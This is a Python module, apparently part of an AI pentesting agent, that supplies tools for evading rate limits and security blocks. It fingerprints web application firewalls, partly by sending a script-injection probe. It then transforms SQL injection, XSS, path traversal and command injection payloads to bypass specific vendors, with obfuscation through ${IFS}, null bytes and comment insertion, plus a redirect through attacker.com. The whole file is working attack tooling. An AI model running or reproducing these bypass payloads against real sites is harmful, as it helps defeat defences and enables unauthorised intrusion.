"""
HTTP Evasion and Stealth Techniques
Bypasses WAF, rate limits, and security blocks for pentesting tools
"""

import random
import re
import time
import urllib.parse
from typing import Any, Dict, List, Optional, Tuple

try:
    import requests as _requests
    _REQUESTS_AVAILABLE = True
except ImportError:
    _REQUESTS_AVAILABLE = False

try:
    from agents import function_tool
except ImportError:
    def function_tool(*args, **kwargs):
        def decorator(fn):
            return fn
        return decorator if args and callable(args[0]) else decorator


# Realistic User-Agent rotation pool
USER_AGENTS = [
    # Chrome on Windows
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
    
    # Chrome on Mac
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    
    # Firefox on Windows
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
    
    # Firefox on Mac
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko/20100101 Firefox/133.0",
    
    # Safari on Mac
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15",
    
    # Edge on Windows
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0",
    
    # Chrome on Linux
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    
    # Mobile browsers
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.135 Mobile Safari/537.36",
]


# Common legitimate headers
DEFAULT_HEADERS = {
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
    "Accept-Encoding": "gzip, deflate, br",
    "DNT": "1",
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "none",
    "Sec-Fetch-User": "?1",
    "Cache-Control": "max-age=0",
}


class HttpEvasion:
    """HTTP request evasion techniques for bypassing WAF and security blocks"""
    
    def __init__(self, 
                 delay_min: float = 0.5,
                 delay_max: float = 2.0,
                 rotate_user_agent: bool = True,
                 use_realistic_headers: bool = True,
                 max_retries: int = 3):
        """
        Initialize HTTP evasion settings.
        
        Args:
            delay_min: Minimum delay between requests (seconds)
            delay_max: Maximum delay between requests (seconds)
            rotate_user_agent: Rotate User-Agent for each request
            use_realistic_headers: Add realistic browser headers
            max_retries: Maximum retry attempts on failure
        """
        self.delay_min = delay_min
        self.delay_max = delay_max
        self.rotate_user_agent = rotate_user_agent
        self.use_realistic_headers = use_realistic_headers
        self.max_retries = max_retries
        self.request_count = 0
        self.last_request_time = 0
    
    def get_random_user_agent(self) -> str:
        """Get a random realistic User-Agent string"""
        return random.choice(USER_AGENTS)
    
    def get_headers(self, custom_headers: Optional[Dict[str, str]] = None) -> Dict[str, str]:
        """
        Build headers with evasion techniques.
        
        Args:
            custom_headers: Additional custom headers to include
            
        Returns:
            Dictionary of HTTP headers
        """
        headers = {}
        
        # Add realistic browser headers
        if self.use_realistic_headers:
            headers.update(DEFAULT_HEADERS)
        
        # Rotate User-Agent
        if self.rotate_user_agent:
            headers["User-Agent"] = self.get_random_user_agent()
        else:
            headers["User-Agent"] = USER_AGENTS[0]
        
        # Add custom headers (overrides defaults)
        if custom_headers:
            headers.update(custom_headers)
        
        return headers
    
    def apply_delay(self):
        """Apply random delay to avoid rate limiting"""
        current_time = time.time()
        
        # Calculate time since last request
        if self.last_request_time > 0:
            time_since_last = current_time - self.last_request_time
            
            # Apply delay if needed
            delay = random.uniform(self.delay_min, self.delay_max)
            if time_since_last < delay:
                sleep_time = delay - time_since_last
                time.sleep(sleep_time)
        
        self.last_request_time = time.time()
        self.request_count += 1
    
    def get_curl_args(self, extra_args: Optional[List[str]] = None) -> List[str]:
        """
        Get curl command arguments with evasion.
        
        Args:
            extra_args: Additional curl arguments
            
        Returns:
            List of curl arguments
        """
        args = [
            "-A", self.get_random_user_agent(),  # User-Agent
            "-H", f"Accept: {DEFAULT_HEADERS['Accept']}",
            "-H", f"Accept-Language: {DEFAULT_HEADERS['Accept-Language']}",
            "-H", f"Accept-Encoding: {DEFAULT_HEADERS['Accept-Encoding']}",
            "--compressed",  # Support gzip/deflate
            "--max-time", "30",  # Timeout
            "-L",  # Follow redirects
            "--retry", str(self.max_retries),  # Retry on failure
            "--retry-delay", "2",  # Delay between retries
        ]
        
        if extra_args:
            args.extend(extra_args)
        
        return args
    
    def get_nuclei_args(self) -> List[str]:
        """Get nuclei command arguments with rate limiting"""
        return [
            "-rate-limit", "50",  # 50 requests per second max
            "-bulk-size", "10",  # Process 10 templates at a time
            "-timeout", "10",  # 10 second timeout
            "-retries", str(self.max_retries),
        ]
    
    def get_httpx_args(self) -> List[str]:
        """Get httpx command arguments with evasion"""
        return [
            "-random-agent",  # Randomize User-Agent
            "-rate-limit", "100",  # 100 requests per second
            "-threads", "25",  # Moderate thread count
            "-timeout", "10",
            "-retries", str(self.max_retries),
            "-follow-redirects",
        ]
    
    def get_subfinder_args(self) -> List[str]:
        """Get subfinder command arguments with rate limiting"""
        return [
            "-rate-limit", "50",  # Rate limit to avoid blocks
            "-timeout", "10",
            "-max-time", "10",  # Max time per source
        ]


# Global evasion instance
_global_evasion = HttpEvasion()


def get_evasion() -> HttpEvasion:
    """Get the global HTTP evasion instance"""
    return _global_evasion


def configure_evasion(delay_min: float = 0.5,
                     delay_max: float = 2.0,
                     rotate_user_agent: bool = True,
                     use_realistic_headers: bool = True,
                     max_retries: int = 3):
    """
    Configure global HTTP evasion settings.
    
    Args:
        delay_min: Minimum delay between requests (seconds)
        delay_max: Maximum delay between requests (seconds)
        rotate_user_agent: Rotate User-Agent for each request
        use_realistic_headers: Add realistic browser headers
        max_retries: Maximum retry attempts on failure
    """
    global _global_evasion
    _global_evasion = HttpEvasion(
        delay_min=delay_min,
        delay_max=delay_max,
        rotate_user_agent=rotate_user_agent,
        use_realistic_headers=use_realistic_headers,
        max_retries=max_retries
    )


def get_stealth_curl_command(url: str, method: str = "GET", 
                            data: Optional[str] = None,
                            custom_headers: Optional[Dict[str, str]] = None) -> List[str]:
    """
    Build a stealth curl command with evasion.
    
    Args:
        url: Target URL
        method: HTTP method
        data: POST data (optional)
        custom_headers: Custom headers (optional)
        
    Returns:
        List of curl command arguments
    """
    evasion = get_evasion()
    cmd = ["curl", "-s", "-X", method]
    
    # Add evasion arguments
    cmd.extend(evasion.get_curl_args())
    
    # Add custom headers
    headers = evasion.get_headers(custom_headers)
    for key, value in headers.items():
        cmd.extend(["-H", f"{key}: {value}"])
    
    # Add POST data if provided
    if data:
        cmd.extend(["-d", data])
    
    # Add URL
    cmd.append(url)
    
    return cmd


def get_safe_headers_dict() -> Dict[str, str]:
    """Get a safe dictionary of headers for requests library"""
    evasion = get_evasion()
    return evasion.get_headers()


def apply_request_delay():
    """Apply rate limiting delay before making a request"""
    evasion = get_evasion()
    evasion.apply_delay()


# ─────────────────────────────────────────────────────────────────────────────
# Phase 3: WAF Detector + Bypass Engine
# ─────────────────────────────────────────────────────────────────────────────

# WAF fingerprints: vendor → list of (source, pattern) tuples
# source: "header:<name>", "body", "status"
WAF_SIGNATURES: Dict[str, List[Tuple[str, str]]] = {
    "Cloudflare": [
        ("header:cf-ray",            r".+"),
        ("header:server",            r"cloudflare"),
        ("body",                      r"Attention Required! \| Cloudflare"),
        ("body",                      r"cloudflare\.com/9xx-error-landing"),
        ("header:x-powered-by",       r"cloudflare"),
    ],
    "AWS WAF": [
        ("header:x-amzn-requestid",   r".+"),
        ("header:x-amz-cf-id",        r".+"),
        ("body",                      r"<title>403 Forbidden</title>[\s\S]*?Request ID"),
        ("header:server",             r"awselb|AmazonS3"),
    ],
    "Akamai": [
        ("header:x-check-cacheable",  r".+"),
        ("header:akamai-origin-hop",   r".+"),
        ("body",                      r"Reference #\d+\.\d+\.\d+"),
        ("header:server",             r"AkamaiGHost"),
    ],
    "Imperva Incapsula": [
        ("header:x-iinfo",            r".+"),
        ("header:x-cdn",              r"Imperva"),
        ("body",                      r"Incapsula incident ID"),
        ("body",                      r"_Incapsula_Resource"),
    ],
    "F5 BIG-IP ASM": [
        ("header:x-cnection",         r".+"),
        ("header:set-cookie",         r"TS[0-9a-f]{8,}"),
        ("body",                      r"The requested URL was rejected\. Please consult with your administrator"),
        ("header:server",             r"BigIP"),
    ],
    "Sucuri": [
        ("header:x-sucuri-id",        r".+"),
        ("header:x-sucuri-cache",     r".+"),
        ("body",                      r"Access Denied - Sucuri Website Firewall"),
    ],
    "Barracuda": [
        ("header:set-cookie",         r"barra_counter_session"),
        ("body",                      r"You have been blocked"),
        ("body",                      r"Barracuda Networks"),
    ],
    "ModSecurity": [
        ("header:server",             r"Mod_Security|mod_security|ModSecurity"),
        ("body",                      r"Not Acceptable!.*ModSecurity"),
        ("body",                      r"This error was generated by Mod_Security"),
    ],
    "Wordfence": [
        ("body",                      r"Generated by Wordfence"),
        ("body",                      r"wordfence\.com"),
        ("header:x-fw-hash",          r".+"),
    ],
    "Fortinet FortiWeb": [
        ("header:set-cookie",         r"FORTIWAFSID"),
        ("body",                      r"FortiWeb"),
        ("header:server",             r"FortiWeb"),
    ],
    "Alibaba Cloud WAF": [
        ("header:ali-swift-global-savetime", r".+"),
        ("body",                            r"error-page\.aliyun\.com"),
    ],
    "Nginx": [
        ("header:server",             r"nginx"),
    ],
    "Apache": [
        ("header:server",             r"Apache"),
    ],
}

# WAF-specific recommended bypass techniques per attack category
WAF_BYPASS_STRATEGIES: Dict[str, Dict[str, List[str]]] = {
    "Cloudflare": {
        "sqli":         ["case_variation", "comment_insertion", "url_encode", "whitespace_variation", "hex_encode"],
        "xss":          ["html_entity_encode", "case_variation", "js_unicode_escape", "tag_attribute_bypass"],
        "lfi":          ["url_encode", "double_encode", "path_normalization", "null_byte"],
        "rce":          ["url_encode", "case_variation", "ifs_separator"],
        "ssrf":         ["ip_variation", "scheme_variation", "redirect_chain"],
        "ssti":         ["url_encode", "string_concatenation"],
        "default":      ["user_agent_rotation", "ip_rotation", "slow_request"],
    },
    "AWS WAF": {
        "sqli":         ["comment_insertion", "url_encode", "case_variation"],
        "xss":          ["html_entity_encode", "svg_bypass", "event_handler_variation"],
        "lfi":          ["url_encode", "path_normalization"],
        "ssrf":         ["ip_variation", "redirect_chain"],
        "default":      ["header_variation", "user_agent_rotation"],
    },
    "Akamai": {
        "sqli":         ["url_encode", "comment_insertion", "hex_encode"],
        "xss":          ["html_entity_encode", "js_unicode_escape"],
        "lfi":          ["double_encode", "path_normalization"],
        "ssrf":         ["ip_variation"],
        "default":      ["slow_request", "chunked_encoding"],
    },
    "Imperva Incapsula": {
        "sqli":         ["comment_insertion", "whitespace_variation", "case_variation"],
        "xss":          ["html_entity_encode", "tag_attribute_bypass"],
        "default":      ["user_agent_rotation", "header_variation"],
    },
    "F5 BIG-IP ASM": {
        "sqli":         ["url_encode", "comment_insertion"],
        "xss":          ["html_entity_encode", "case_variation"],
        "lfi":          ["url_encode", "null_byte"],
        "default":      ["chunked_encoding", "header_obfuscation"],
    },
    "ModSecurity": {
        "sqli":         ["comment_insertion", "case_variation", "hex_encode", "url_encode"],
        "xss":          ["html_entity_encode", "js_unicode_escape", "tag_attribute_bypass"],
        "lfi":          ["double_encode", "null_byte", "path_normalization"],
        "rce":          ["url_encode", "ifs_separator", "hex_encode"],
        "default":      ["chunked_encoding", "whitespace_variation"],
    },
    "generic": {
        "sqli":         ["url_encode", "case_variation", "comment_insertion"],
        "xss":          ["html_entity_encode", "url_encode"],
        "lfi":          ["url_encode", "double_encode", "path_normalization"],
        "rce":          ["url_encode", "hex_encode"],
        "ssrf":         ["ip_variation", "url_encode"],
        "ssti":         ["url_encode"],
        "xxe":          ["utf16_encode", "multi_byte"],
        "default":      ["user_agent_rotation"],
    },
}

# Payload transform functions for each bypass technique
_TRANSFORMS: Dict[str, Any] = {
    "url_encode":         lambda p: urllib.parse.quote(p, safe=""),
    "double_encode":      lambda p: urllib.parse.quote(urllib.parse.quote(p, safe=""), safe=""),
    "case_variation":     lambda p: "".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(p)),
    "comment_insertion":  lambda p: p.replace(" ", "/**/"),
    "whitespace_variation": lambda p: p.replace(" ", "\t"),
    "hex_encode":         lambda p: "".join(f"%{ord(c):02X}" for c in p),
    "null_byte":          lambda p: p + "%00",
    "double_slash":       lambda p: p.replace("/", "//"),
    "backslash":          lambda p: p.replace("/", "\\\\"),
    "path_normalization": lambda p: p.replace("../", "..././"),
    "html_entity_encode": lambda p: "".join(f"&#{ord(c)};" for c in p),
    "js_unicode_escape":  lambda p: "".join(f"\\u{ord(c):04X}" for c in p),
    "tag_attribute_bypass": lambda p: p.replace("<script>", "<ScRiPt>"),
    "ip_variation":       lambda p: re.sub(
                              r'(\d+)\.(\d+)\.(\d+)\.(\d+)',
                              lambda m: f"0x{int(m.group(1)):02X}{int(m.group(2)):02X}{int(m.group(3)):02X}{int(m.group(4)):02X}",
                              p
                          ),
    "scheme_variation":   lambda p: p.replace("http://", "http:").replace("https://", "https:"),
    "ifs_separator":      lambda p: p.replace(" ", "${IFS}"),
    "string_concatenation": lambda p: p.replace("7*7", "7\u006d*7"),  # template injection obfuscation
    "chunked_encoding":   lambda p: p,   # header-level, returned as-is with note
    "redirect_chain":     lambda p: f"http://attacker.com/r?u={urllib.parse.quote(p)}",
    "user_agent_rotation": lambda p: p,  # request-level, payload unchanged
    "header_variation":   lambda p: p,
    "slow_request":       lambda p: p,
    "header_obfuscation": lambda p: p,
    "svg_bypass":         lambda p: p.replace("<script>", "<svg/onload="),
    "event_handler_variation": lambda p: p.replace("onerror=", "OnErRoR="),
    "utf16_encode":       lambda p: p.encode("utf-16").decode("latin-1", errors="replace"),
    "multi_byte":         lambda p: p,
    "json_nested":        lambda p: p,
    "extension_bypass":   lambda p: p.replace(".php", ".php5"),
    "mime_type_bypass":   lambda p: p,
    "header_case_variation": lambda p: p,
    "external_dtd":       lambda p: p,
}


class WAFDetector:
    """Passive + active WAF fingerprinting engine."""

    def fingerprint_from_response(
        self,
        status_code: int,
        headers: Dict[str, str],
        body: str,
    ) -> Tuple[str, float, List[str]]:
        """
        Identify WAF from response metadata.

        Returns:
            (vendor, confidence_0_to_1, matched_signatures)
        """
        scores: Dict[str, int] = {}
        matched: Dict[str, List[str]] = {}

        lower_headers = {k.lower(): v for k, v in headers.items()}

        for vendor, sigs in WAF_SIGNATURES.items():
            for src, pattern in sigs:
                hit = False
                if src.startswith("header:"):
                    hdr = src[len("header:"):]
                    val = lower_headers.get(hdr, "")
                    hit = bool(re.search(pattern, val, re.IGNORECASE))
                elif src == "body":
                    hit = bool(re.search(pattern, body, re.IGNORECASE))
                elif src == "status":
                    hit = str(status_code) == pattern
                if hit:
                    scores[vendor] = scores.get(vendor, 0) + 1
                    matched.setdefault(vendor, []).append(f"{src}={pattern}")

        if not scores:
            return ("unknown", 0.0, [])

        best = max(scores, key=lambda v: scores[v])
        max_sigs = len(WAF_SIGNATURES[best])
        confidence = min(scores[best] / max_sigs, 1.0)
        return (best, round(confidence, 2), matched.get(best, []))

    def fetch_and_fingerprint(self, url: str) -> Tuple[str, float, List[str]]:
        """
        Send a probe request + a basic XSS probe, then fingerprint.
        Returns (vendor, confidence, matched_signatures).
        """
        if not _REQUESTS_AVAILABLE:
            return ("unknown", 0.0, ["requests library not available"])

        evasion = get_evasion()
        headers = evasion.get_headers()
        vendor, confidence, sigs = ("unknown", 0.0, [])

        # 1. Normal baseline request
        try:
            resp = _requests.get(url, headers=headers, timeout=10, verify=False, allow_redirects=True)
            vendor, confidence, sigs = self.fingerprint_from_response(
                resp.status_code, dict(resp.headers), resp.text[:4096]
            )
        except Exception:
            pass

        # 2. If no match yet, send a probe likely to trigger the WAF
        if vendor == "unknown":
            probe_url = url + ("?x=" + urllib.parse.quote("<script>alert(1)</script>") if "?" not in url else "&x=" + urllib.parse.quote("<script>alert(1)</script>"))
            try:
                resp2 = _requests.get(probe_url, headers=headers, timeout=10, verify=False, allow_redirects=True)
                vendor, confidence, sigs = self.fingerprint_from_response(
                    resp2.status_code, dict(resp2.headers), resp2.text[:4096]
                )
            except Exception:
                pass

        return (vendor, confidence, sigs)


_waf_detector = WAFDetector()


def get_bypass_strategies(vendor: str, attack_type: str) -> List[str]:
    """Return the ordered bypass technique list for a WAF vendor + attack type."""
    vendor_key = vendor if vendor in WAF_BYPASS_STRATEGIES else "generic"
    strategies = WAF_BYPASS_STRATEGIES[vendor_key]
    return strategies.get(attack_type, strategies.get("default", []))


def apply_bypass_transform(payload: str, technique: str) -> str:
    """Apply a named bypass transform to a payload string."""
    transform = _TRANSFORMS.get(technique)
    if transform is None:
        return payload
    try:
        return transform(payload)
    except Exception:
        return payload


@function_tool()
def waf_fingerprint(url: str) -> str:
    """
    Fingerprint the WAF protecting a URL using HTTP response header and body analysis.
    Detects Cloudflare, AWS WAF, Akamai, Imperva, F5, Sucuri, ModSecurity, Wordfence,
    FortiWeb, Barracuda, Alibaba WAF, and generic servers.

    Args:
        url: The target URL to probe (e.g., https://target.com)

    Returns:
        Detected WAF vendor, confidence score, matched signatures, and recommended
        bypass strategy categories for common attack types.
    """
    vendor, confidence, sigs = _waf_detector.fetch_and_fingerprint(url)

    lines = [
        f"## WAF Fingerprint: {url}",
        "",
        f"**Detected WAF:** {vendor}",
        f"**Confidence:**   {int(confidence * 100)}%",
    ]

    if sigs:
        lines.append("\n**Matched Signatures:**")
        for s in sigs:
            lines.append(f"  - {s}")

    # Show recommended techniques per attack type
    vendor_key = vendor if vendor in WAF_BYPASS_STRATEGIES else "generic"
    strategies = WAF_BYPASS_STRATEGIES[vendor_key]
    lines.append("\n**Recommended Bypass Techniques by Attack Type:**")
    for attack_type, techniques in strategies.items():
        lines.append(f"  {attack_type:12s}: {', '.join(techniques)}")

    lines.append("\n> Use `waf_bypass_payloads(vuln_type, waf_name)` to get transformed payload variants.")
    return "\n".join(lines)


@function_tool()
def waf_bypass_payloads(vuln_type: str, waf_name: str = "generic") -> str:
    """
    Generate WAF bypass payload variants for a specific vulnerability type and WAF.
    Uses the vulnerability knowledge base to source canonical payloads, then applies
    applicable WAF bypass transforms to produce evasion variants.

    Args:
        vuln_type: Vulnerability type from the KB (e.g., 'sqli_error_based', 'xss_reflected',
                   'lfi', 'rce', 'ssrf', 'ssti', 'sqli', 'xss')
        waf_name:  Detected WAF name (e.g., 'Cloudflare', 'AWS WAF', 'ModSecurity').
                   Use 'generic' if WAF is unknown.

    Returns:
        Transformed payload variants with the technique used for each.
    """
    import json
    from pathlib import Path

    # Load KB
    kb_path = Path(__file__).resolve().parent.parent.parent / "data" / "vuln_knowledge_base.json"
    raw_payloads: List[str] = []
    if kb_path.exists():
        try:
            with open(kb_path, "r", encoding="utf-8") as fh:
                kb = json.load(fh)
            for entry in kb.get("vulnerabilities", []):
                if entry.get("id") == vuln_type or vuln_type in entry.get("id", ""):
                    raw_payloads = entry.get("payloads", [])[:8]  # cap at 8
                    break
            # fall back: partial match on name
            if not raw_payloads:
                vuln_lower = vuln_type.lower()
                for entry in kb.get("vulnerabilities", []):
                    if vuln_lower in entry.get("name", "").lower():
                        raw_payloads = entry.get("payloads", [])[:8]
                        break
        except Exception:
            pass

    if not raw_payloads:
        raw_payloads = ["<script>alert(1)</script>", "' OR 1=1--", "../etc/passwd"]

    # Derive attack category (sqli, xss, lfi, rce, ssrf, ssti …)
    type_map = {
        "sqli": "sqli", "sql": "sqli",
        "xss": "xss", "cross_site": "xss",
        "lfi": "lfi", "rfi": "lfi", "path_traversal": "lfi", "traversal": "lfi",
        "rce": "rce", "command": "rce", "injection": "rce",
        "ssrf": "ssrf",
        "ssti": "ssti", "template": "ssti",
        "xxe": "xxe",
    }
    attack_cat = "default"
    v_lower = vuln_type.lower()
    for key, cat in type_map.items():
        if key in v_lower:
            attack_cat = cat
            break

    techniques = get_bypass_strategies(waf_name, attack_cat)

    lines = [
        "## WAF Bypass Payloads",
        f"**Vuln Type:** {vuln_type}  |  **WAF:** {waf_name}  |  **Attack Category:** {attack_cat}",
        f"**Techniques:** {', '.join(techniques)}",
        "",
    ]

    for technique in techniques:
        lines.append(f"### Technique: `{technique}`")
        for raw in raw_payloads:
            transformed = apply_bypass_transform(raw, technique)
            if transformed != raw:
                lines.append(f"  Original : {raw}")
                lines.append(f"  Bypassed : {transformed}")
                lines.append("")
        lines.append("")

    if len(lines) < 8:
        lines.append("_No byte-level transforms applicable — use request-level techniques (header_variation, slow_request, etc.)_")

    return "\n".join(lines)


@function_tool()
def apply_waf_bypass(payload: str, technique: str) -> str:
    """
    Apply a single named WAF bypass transform to a payload string and return the result.
    Useful for quick one-off payload obfuscation without needing to pull from the KB.

    Available techniques:
        url_encode, double_encode, case_variation, comment_insertion,
        whitespace_variation, hex_encode, null_byte, double_slash, backslash,
        path_normalization, html_entity_encode, js_unicode_escape,
        tag_attribute_bypass, ip_variation, scheme_variation, ifs_separator,
        string_concatenation, chunked_encoding, redirect_chain,
        svg_bypass, event_handler_variation, utf16_encode, extension_bypass

    Args:
        payload:   The raw payload string to transform.
        technique: The bypass technique name (see list above).

    Returns:
        The transformed payload string, or the original if the technique is
        request-level only (e.g., slow_request, user_agent_rotation).
    """
    if technique not in _TRANSFORMS:
        available = ", ".join(sorted(_TRANSFORMS.keys()))
        return f"Unknown technique '{technique}'. Available: {available}"

    result = apply_bypass_transform(payload, technique)
    return f"**Technique:** {technique}\n**Original:**  {payload}\n**Result:**    {result}"

